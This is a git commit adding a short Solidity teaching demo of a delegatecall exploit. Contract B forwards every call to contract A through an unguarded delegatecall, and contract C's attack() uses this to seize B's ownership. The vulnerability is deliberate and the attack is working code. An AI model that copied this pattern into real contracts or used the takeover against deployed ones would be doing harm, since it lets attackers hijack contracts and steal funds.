59e64f62019464772758135ccfbe9e46fdd8ccfe
Joseph Del Giorgio <106563909+Joseph-DelGiorgio@users.noreply.github.com>
2022-10-15 11:56:01 -0700

    Create DelegateCall_Hack.sol

---
+++ DelegateCall_Hack.sol
@@ -0,0 +1,41 @@
+//This content purpose was to show how to hack contracts with DelegateCall, and show why this has been exploited.
+// video link: https://youtu.be/N7MWrjHe5Xs
+//SPDX-License-Identifier: Unlicense
+pragma solidity ^0.8.0;
+
+import "hardhat/console.sol";
+
+contract A {
+    address public owner;
+
+    function setOwner() public {
+        owner = msg.sender;
+        console.log("msg.sender", msg.sender);
+    }
+}
+
+contract B {
+    address public owner;
+    A public a;
+
+    constructor(A _a) {
+        owner = msg.sender;
+        a = A(_a);
+    }
+
+    fallback() external payable {
+        address(a).delegatecall(msg.data);
+    }
+}
+
+contract C {
+    address public b;
+
+    constructor(address _b) {
+        b = _b;
+    }
+
+    function attack() public {
+        b.call(abi.encodeWithSignature("setOwner()"));
+    }
+}
